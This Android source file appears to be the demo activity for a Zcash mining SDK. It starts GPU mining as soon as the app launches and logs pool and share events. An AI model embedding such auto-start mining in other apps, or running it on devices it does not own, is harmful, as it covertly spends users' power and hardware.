package io.waterhole.miner;

import android.app.Activity;
import android.os.Bundle;

import waterhole.miner.core.MineCallback;
import waterhole.miner.core.utils.LogUtils;
import waterhole.miner.zcash.ZcashMiner;

import static waterhole.miner.core.utils.LogUtils.info;
import static waterhole.miner.core.utils.LogUtils.error;

public final class MainActivity extends Activity {

    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        LogUtils.enableDebug(true);

        ZcashMiner.instance().setContext(getApplicationContext()).setMineCallback(new MineCallback<Double>() {

            @Override
            public void onConnectPoolBegin() {
                info(TAG, "onConnectPoolBegin");
            }

            @Override
            public void onConnectPoolSuccess() {
                info(TAG, "onConnectPoolSuccess");
            }

            @Override
            public void onConnectPoolFail(String error) {
                error(TAG, "onConnectPoolFail: " + error);
            }

            @Override
            public void onPoolDisconnect(String error) {
                error(TAG, "onPoolDisconnect: " + error);
            }

            @Override
            public void onMessageFromPool(String message) {
                info(TAG, "onMessageFromPool: " + message);
            }

            @Override
            public void onMiningStart() {
                info(TAG,"onMiningStart");
            }

            @Override
            public void onMiningStop() {
                info(TAG,"onMiningStop");
            }

            @Override
            public void onMiningError(String error) {
                error(TAG, "onMiningError = " + error);
            }

            @Override
            public void onMiningSpeed(Double value) {
                info(TAG, "onMiningSpeed: " + value);
            }

            @Override
            public void onSubmitShare(Double total, Double average) {
                info(TAG, "onSubmitShare: total = " + total + ", average = " + average);
            }
        }).useMultGpusIfSupport(true).startMine();
    }
}
